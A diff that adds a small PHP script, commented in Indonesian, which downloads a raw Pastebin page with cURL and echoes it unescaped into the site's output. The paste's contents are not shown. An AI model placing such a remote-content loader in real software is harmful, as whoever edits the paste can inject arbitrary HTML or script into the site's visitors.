@@ -1,0 +1,20 @@
+<?php
+// URL Pastebin yang berisi kode HTML
+$pastebinUrl = 'https://pastebin.com/raw/1ysLUvT5';
+
+// Fungsi untuk mengambil konten dari URL menggunakan cURL
+function getContentFromUrl($url)
+{
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+// Mengambil konten dari URL Pastebin
+$htmlContent = getContentFromUrl($pastebinUrl);
+
+// Tampilkan hasilnya
+echo $htmlContent;
+?>
